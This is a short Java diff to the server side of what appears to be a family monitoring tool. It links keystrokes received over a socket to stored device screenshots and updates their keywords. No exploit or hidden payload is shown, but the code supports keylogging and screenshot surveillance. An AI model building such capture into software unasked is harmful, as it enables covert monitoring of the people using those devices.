@@ -8,7 +8,9 @@ import java.util.UUID;
 
 import com.family.server.controller.KeyStrokeController;
 import com.family.server.model.KeyStroke;
+import com.family.server.model.Screenshot;
 import com.family.server.repository.KeyStrokeDAO;
+import com.family.server.repository.ScreenshotDAO;
 
 public class KeyStrokeBusiness extends Thread {
 	Socket soc;
@@ -43,6 +45,11 @@ public class KeyStrokeBusiness extends Thread {
 				
 				KeyStrokeController kc = new KeyStrokeController();
 				kc.addKeyStroke(model);
+				
+				Screenshot s = kc.getScreetshotByKeyStroke(model, deviceID);
+				ScreenshotDAO sDAO = new ScreenshotDAO();
+				sDAO.updateScreenshotKeyword(s.getId().toString());
+				sDAO.close();
 			}
 			
 		}
